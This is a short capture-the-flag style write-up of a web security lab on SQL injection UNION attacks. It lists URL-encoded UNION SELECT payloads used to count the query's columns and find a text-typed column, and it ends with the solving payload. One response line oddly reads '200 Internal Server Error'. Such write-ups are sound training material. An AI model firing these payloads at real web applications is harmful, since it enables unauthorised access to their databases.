# Lab: SQL injection UNION attack, finding a column containing text
## Description

Found the vulnerable parameter `category` and started the attack it with the following payloads:
```
'+UNION+SELECT+NULL-- 					 <-- 500 Internal Server Error
'+UNION+SELECT+NULL,NULL--				 <-- 500 Internal Server Error
'+UNION+SELECT+NULL,NULL,NULL--			 <-- 200 Internal Server Error
'+UNION+SELECT+NULL,NULL,NULL,NULL-- 	 <-- 500 Internal Server Error
```
Based on above, we've found the number of columns (3) in the SQL query.

Now, we needed to inject a random string value (`gVGtT4`) into the query so its returned on in the HTTP response. For each NULL, I attempted to inject the value until it was returned. 

The second column in the query was a `string` which could be used to inject the random value.

## Solution

`'+UNION+SELECT+NULL,'gVGtT4',NULL--`
